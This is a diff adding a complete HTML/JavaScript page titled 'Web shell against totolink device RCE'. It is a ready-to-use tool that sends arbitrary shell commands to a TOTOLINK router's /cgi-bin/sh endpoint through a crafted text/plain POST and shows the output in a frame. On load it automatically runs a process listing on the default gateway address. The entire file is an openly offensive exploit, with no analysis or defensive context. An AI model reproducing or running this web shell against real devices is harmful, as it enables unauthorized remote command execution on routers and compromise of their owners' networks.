@@ -1,0 +1,98 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Web shell against totolink device RCE</title>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+    <script>
+      var path = "/cgi-bin/sh";
+      var prefix = "X;echo 'Content-type: text/plain';echo;";
+      function send() {
+        $('#f').attr('action', 'http://' + $('#ip').val() + path);
+        var text = $("#command").val();
+        text = text.replace(/^\s+|\s+$/g, '').replace(/[\r\n]+/g, "\r\n").split('\r\n').join(';');
+        console.log(text);
+        $('#form-inner').val(prefix + text + ';echo --- end of result ---;');
+        $('#f').submit();
+      }
+      $(function () {
+        $('#send').on('click', send);
+        send();
+      });
+    </script>
+    <link href="//cdnjs.cloudflare.com/ajax/libs/normalize/3.0.2/normalize.min.css" rel="stylesheet" type="text/css" />
+    <style>
+      html, body {
+        background : #444444;
+        color: #fefefe;
+      }
+      textarea, input[type=text] {
+        background: transparent;
+        border: none;
+      }
+      .wrap {
+        margin: 2em;
+        padding: 1em;
+        position: relative;
+        background: #777777;
+        border-radius: 1em;
+        line-height: 2em;
+      }
+      .wrap * {
+        vertical-align: middle;
+      }
+      .wrap::after {
+        display: table;
+        content: "";
+        font-size: 0px;
+        clear: both;
+      }/*
+      .target, #ip {
+        float: left;
+      }*/
+      #send {
+        float: right;
+        background: #cccccc;
+        border: none;
+        border-radius: 0.5em;
+      }
+      #command, #to {
+        width: 100%;
+        height: 300px;
+        line-height: 1.2em;
+        font-family: monospace;
+      }
+      #to {
+        background: white;
+      }
+      #command {
+        border-top: 1px solid #cccccc;
+        border-bottom: 1px solid #cccccc;
+      }
+      #ip {
+        border-bottom: 1px solid #cccccc;
+      }
+    </style>
+  </head>
+  <body>
+    <form id="f" name="f" method="POST" action="http://192.168.1.254/cgi-bin/sh" enctype="text/plain"  target="to" style="display:none">
+      <input id="form-inner" type="hidden" name="X" value="X;echo 'Content-type: text/plain';echo;echo Current process;echo;ps -auxw;">
+    </form>
+    <div class="wrap">
+      <h1>Web shell against totolink device RCE</h1>
+    </div>
+    <div class="wrap">
+      <h3>command</h3>
+      <textarea name="command" id="command" cols="80" rows="10">cd /
+ls</textarea>
+    </div>
+    <div class="wrap">
+      <span class="target">target: </span>
+      <input type="text" name="ip" id="ip" value="192.168.1.254" placehoder="ip of gateway(ip of target device)">
+      <button id="send">send</button>
+    </div>
+    <div class="wrap">
+      <h3>result</h3>
+      <iframe src="" frameborder="0" name="to" id="to"></iframe>
+    </div>
+  </body> 
+</html>
